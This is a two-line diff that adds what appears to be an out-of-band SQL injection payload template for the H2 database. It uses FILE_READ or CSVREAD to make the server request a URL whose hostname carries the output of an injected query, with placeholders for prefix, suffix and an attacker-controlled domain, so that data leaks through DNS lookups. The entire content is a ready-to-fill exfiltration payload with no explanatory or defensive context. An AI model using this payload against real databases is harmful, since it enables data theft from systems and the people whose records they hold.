@@ -1,0 +1,2 @@
+SELECT FILE_READ('http://%PREFIX%.'||(%QUERY%)||'.%SUFFIX%.%DOMAIN%/', NULL)
+# or SELECT CSVREAD('http://%PREFIX%.'||(%QUERY%)||'.%SUFFIX%.%DOMAIN%/')
